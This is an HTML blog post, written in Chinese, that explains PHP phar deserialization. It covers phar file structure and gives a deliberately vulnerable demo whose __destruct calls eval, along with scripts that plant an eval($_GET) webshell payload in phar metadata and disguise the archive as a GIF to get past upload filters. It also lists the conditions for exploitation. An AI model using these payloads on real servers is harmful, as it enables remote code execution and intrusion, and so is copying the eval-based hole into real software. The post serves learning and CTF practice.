@@ -1,0 +1,252 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHP Phar原理学习 - H3ppo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ppo,"> 
+    <meta name="description" content="流包装大多数PHP文件操作允许使用各种URL协议去访问文件路径：如data://，zlib://或php://。 例如常见的
+include(&#39;php://filter/read=convert.b,"> 
+    <meta name="author" content="H3ppo"> 
+    <link rel="alternative" href="/atom.xml" title="H3ppo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ppo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://H3ppo.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHP Phar原理学习</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHP Phar原理学习</h1>
+        <div class="stuff">
+            <span>七月 23, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHPsec/" rel="tag">PHPsec</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="流包装"><a href="#流包装" class="headerlink" title="流包装"></a>流包装</h2><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p>
+<pre><code>include('php://filter/read=convert.base64-encode/resource=index.php');
+include('data://text/plain;base64,xxxxxxxxxxxx');</code></pre>
+<p><code>phar://</code>也是流包装的一种</p>
+<h2 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>压缩文件的属性等信息，以序列化存储。</p>
+<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容。</p>
+<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，放在文件末尾。</p>
+<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
+<p>假设有test.php:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Testobj</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">"echo 'ok';"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>生成phar的test.phar:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
+    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//写入stub</span>
+    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
+    <span class="token comment" spellcheck="true">//签名自动计算</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell</p>
+<p>用winhex打开test.phar:</p>
+<p><img src="/2021/07/23/phpsec/php-phar-yuan-li-xue-xi/php-phar-yuan-li-xue-xi/image-20210723025024180.png" alt="image-20210723025024180"></p>
+<p>看到meta-data是以序列化的形式存储的</p>
+<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
+<p><img src="/2021/07/23/phpsec/php-phar-yuan-li-xue-xi/php-phar-yuan-li-xue-xi/image-20210723025147550.png" alt="image-20210723025147550"></p>
+<h2 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h2><p>php识别__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
+    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>
+    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>phar文件要能够上传到服务器端</li>
+<li>要有可用的魔术方法作为“跳板”</li>
+<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li>
+<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox">CISCN:2019-华北赛区-Dropbox</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li><strong>文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</strong></li>
+<li><strong>反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</strong></li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/102683254">https://blog.csdn.net/silence1_/article/details/102683254</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E5%8C%85%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">流包装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">phar原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stub"><span class="toc-number">2.1.</span> <span class="toc-text">stub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#manifest"><span class="toc-number">2.2.</span> <span class="toc-text">manifest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#contents"><span class="toc-number">2.3.</span> <span class="toc-text">contents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signature"><span class="toc-number">2.4.</span> <span class="toc-text">signature</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%89%8B%E5%86%8C"><span class="toc-number">3.</span> <span class="toc-text">官方手册</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#demo"><span class="toc-number"></span> <span class="toc-text">demo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">将phar伪造成其他格式的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
